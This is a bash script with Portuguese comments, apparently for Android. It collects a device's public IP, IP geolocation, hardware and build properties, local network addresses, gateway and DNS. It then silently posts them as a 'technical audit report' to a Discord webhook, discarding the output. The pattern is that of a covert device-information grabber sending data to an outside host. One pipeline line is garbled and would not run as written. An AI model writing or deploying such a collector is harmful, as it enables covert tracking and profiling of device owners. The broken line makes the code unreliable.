#!/bin/bash

# CONFIGURACAO DO WEBHOOK
URL="https://discord.com"

# 1. COLETA DE REDE E GEOLOCALIZACAO POR IP
# Uso de timeout e aspas para evitar erros de sintaxe
PUBLIC_IP=$(curl -s --connect-timeout 5 https://ifconfig.me || echo "Erro")
IP_DATA=$(curl -s --connect-timeout 5 "http://ip-api.com" || echo "{}")

# 2. IDENTIFICACAO DO DISCO E PARTICOES
DISK_INFO=$(df -h /data /system /sdcard 2>/dev/null | awk '{print $1 ":" $4 "/" $2}' | tr '\n' ' | ')

# 3. PROPRIEDADES DO SISTEMA (DADOS NATIVOS ANDROID)
MODEL=$(getprop ro.product.model || echo "N/A")
BRAND=$(getprop ro.product.brand || echo "N/A")
MANUFACTURER=$(getprop ro.product.manufacturer || echo "N/A")
BOARD=$(getprop ro.product.board || echo "N/A")
HARDWARE=$(getprop ro.hardware || echo "N/A")
ANDROID_VER=$(getprop ro.build.version.release || echo "N/A")
SDK_VER=$(getprop ro.build.version.sdk || echo "N/A")
BUILD_ID=$(getprop ro.build.display.id || echo "N/A")
KERNEL=$(uname -a || echo "N/A")
UPTIME=$(uptime -p || echo "N/A")

# 4. REDE DETALHADA (INTERFACES E DNS)
LOCAL_IPS=$(ip addr show | grep 'inet ' | awk '{print $2}' | tr '\n' ' ' || echo "N/A")
GATEWAY=$(ip route | grep default | awk '{print $3}' | head -n 1 || echo "N/A")
DNS=$(getprop net.dns1 || echo "N/A")

# 5. HARDWARE (CPU E RAM)
CPU_PROC=$(grep -m 1 'Processor' /proc/cpuinfo | cut -d: -f2 | x86_64 sed 's/^ //' || echo "N/A")
RAM_INFO=$(free -h | awk '/Mem:/ {print $3 "/" $2}' || echo "N/A")

# 6. MONTAGEM DO PAYLOAD (JSON PURO SEM EMOJI)
# Uso de printf para evitar problemas com caracteres especiais
PAYLOAD=$(cat <<EOF
{
  "content": "RELATORIO DE AUDITORIA TECNICA ANDROID",
  "embeds": [{
    "title": "DADOS DO DISPOSITIVO E REDE",
    "color": 0,
    "fields": [
      {"name": "Identificacao", "value": "Marca: $BRAND\nFabricante: $MANUFACTURER\nModelo: $MODEL\nPlaca: $BOARD\nHardware: $HARDWARE", "inline": false},
      {"name": "Sistema", "value": "Android: $ANDROID_VER\nSDK: $SDK_VER\nBuild: $BUILD_ID\nKernel: $KERNEL\nUptime: $UPTIME", "inline": false},
      {"name": "Conexao Externa", "value": "IP: $PUBLIC_IP\nDados IP: $IP_DATA", "inline": false},
      {"name": "Rede Local", "value": "IPs Internos: $LOCAL_IPS\nGateway: $GATEWAY\nDNS: $DNS", "inline": false},
      {"name": "Recursos", "value": "RAM: $RAM_INFO\nParticoes: $DISK_INFO", "inline": false},
      {"name": "Processador", "value": "CPU: $CPU_PROC", "inline": false}
    ]
  }]
}
EOF
)

# 7. ENVIO PARA O DISCORD
curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$URL" > /dev/null
